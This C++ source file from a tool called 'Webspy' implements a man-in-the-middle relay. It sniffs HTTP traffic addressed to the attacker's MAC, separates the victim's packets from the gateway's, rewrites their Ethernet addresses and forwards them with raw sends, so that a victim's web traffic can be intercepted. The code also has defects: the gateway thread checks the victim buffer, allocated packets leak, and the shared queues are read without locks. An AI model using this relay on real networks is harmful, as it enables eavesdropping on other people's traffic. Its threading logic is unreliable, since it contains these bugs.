/*
 * Pipe.cpp
 *
 *  Created on: 01/06/2015
 *      Author: Felipe Rodopoulos
 */

#include "Pipe.h"

std::queue<Packet>	Pipe::gatewayBuffer;
std::queue<Packet>	Pipe::victimBuffer;
pthread_mutex_t 	Pipe::victimMutex;
pthread_mutex_t 	Pipe::gatewayMutex;
Crafter				Pipe::victimCrafter;
Crafter				Pipe::gatewayCrafter;

Pipe::Pipe(){}

Pipe::~Pipe(){}

void Pipe::init(){
	victimCrafter.init(Globals::iface);
	gatewayCrafter.init(Globals::iface);

	if(pthread_mutex_init(&victimMutex, NULL) < 0){
		printf("Webspy::Pipe::init > [ERRO] can't init relay thread\n");
		exit(EXIT_FAILURE);
	}
	if(pthread_create(&victimThread, nullptr, routeToVictim, nullptr) < 0){
		printf("Webspy::Pipe::init > [ERRO] can't init victim relayer thread\n");
		exit(EXIT_FAILURE);
	}

	if(pthread_mutex_init(&gatewayMutex, NULL) < 0){
		printf("Webspy::Pipe::init > [ERRO] can't init relay thread\n");
		exit(EXIT_FAILURE);
	}
	if(pthread_create(&gatewayThread, nullptr, routeToGateway, nullptr) < 0){
		printf("Webspy::Pipe::init > [ERRO] can't init gateway relayer thread\n");
		exit(EXIT_FAILURE);
	}

	if(pthread_create(&snifferThread, nullptr, connect, nullptr) < 0){
		printf("Webspy::Pipe::init > [ERRO] can't init relay thread\n");
		exit(EXIT_FAILURE);
	}
}

void* Pipe::connect(void* args){
	char filter[] = "tcp port 80";
	Sniffer sniffer(filter);

	sniffer.listen(relay);

	printf("Sai do listen\n");
	return nullptr;
}

void Pipe::relay(u_char* args, const struct pcap_pkthdr* header, const unsigned char* packet){
	Ethernet* ether = (Ethernet*) packet;
	if(!memcmp(Globals::attacker.mac, ether->thaddr, 6)){
		Packet* rcvdPacket = new Packet(packet, header->len);

		IP* ip = (IP*) (packet + 14);
		if(ip->src == Globals::victim.ip){
			pthread_mutex_lock(&victimMutex);
			victimBuffer.push(*rcvdPacket);
			pthread_mutex_unlock(&victimMutex);

		} else if(ip->src == Globals::gateway.ip){
			pthread_mutex_lock(&gatewayMutex);
			gatewayBuffer.push(*rcvdPacket);
			pthread_mutex_unlock(&gatewayMutex);
		}
	}
}

void* Pipe::routeToVictim(void* args){
	while(1 == 1){
		if(!victimBuffer.empty()){
			pthread_mutex_lock(&victimMutex);
			Packet packet = victimBuffer.front();
			victimBuffer.pop();
			pthread_mutex_unlock(&victimMutex);

			Ethernet* ether = (Ethernet*) packet.data;
			memcpy(ether->shaddr, Globals::attacker.mac->ether_addr_octet, 6);
			memcpy(ether->thaddr, Globals::victim.mac->ether_addr_octet, 6);

			printf("Packet: %d bytes    attacker  ->  victim\n", packet.len);
			victimCrafter.sendRaw(packet);
		}
	}
}

void* Pipe::routeToGateway(void* args){
	while(1 == 1){
		if(!victimBuffer.empty()){
			pthread_mutex_lock(&gatewayMutex);
			Packet packet = gatewayBuffer.front();
			gatewayBuffer.pop();
			pthread_mutex_unlock(&gatewayMutex);

			Ethernet* ether = (Ethernet*) packet.data;
			memcpy(ether->shaddr, Globals::attacker.mac->ether_addr_octet, 6);
			memcpy(ether->thaddr, Globals::gateway.mac->ether_addr_octet, 6);

			printf("Packet: %d bytes    attacker  ->  gateway\n", packet.len);
			gatewayCrafter.sendRaw(packet);
		}
	}
}

